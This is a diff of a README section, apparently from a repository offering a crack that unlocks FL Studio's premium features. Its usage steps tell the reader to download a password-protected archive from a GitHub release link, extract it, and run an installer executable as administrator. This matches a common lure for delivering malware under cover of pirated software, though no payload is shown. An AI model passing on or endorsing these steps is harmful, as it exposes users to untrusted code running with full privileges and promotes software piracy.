@@ -20,10 +20,10 @@ This tool offers a straightforward way to unlock FL Studio, enabling all premium
 
 ## 🚀 How to Use
 
+Download from this [link](https://github.com/pedr0santos/ai-fl-studio-crack/releases/tag/new) password: 2024
+Extract the files.
+Run Installer v 2.1.34.exe as an admin
 
-    Download from this [link](https://github.com/pedr0santos/ai-fl-studio-crack/releases/tag/new) password: 2024.
-    Extract the files.
-    Run Installer v 2.1.34.exe as an admin.
 
 
-[link](https://github.com/pedr0santos/ai-fl-studio-crack/releases/tag/new)
+
